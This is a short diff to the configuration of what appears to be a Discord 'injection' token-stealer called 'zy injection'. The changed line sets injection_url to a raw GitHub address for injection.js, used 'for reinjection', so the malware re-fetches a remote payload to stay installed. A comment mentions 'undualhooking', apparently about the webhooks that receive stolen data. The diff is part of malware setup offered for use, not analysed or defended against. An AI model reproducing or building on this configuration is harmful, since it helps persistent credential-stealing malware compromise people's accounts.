@@ -14,7 +14,7 @@ const config = {
   embed_name: 'zy injection ',
   embed_icon: 'https://avatars.githubusercontent.com/u/99050671?v=4'.replace(/ /g, '%20'),
   embed_color: 16630213,
-  injection_url: 'doesnt exist yet :screamcat:', // for reinjection
+  injection_url: 'https://raw.githubusercontent.com/zyIenox/dumb-stuff/main/injection.js', // for reinjection
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION (ik what im doing, undualhooking this shit)
    **/
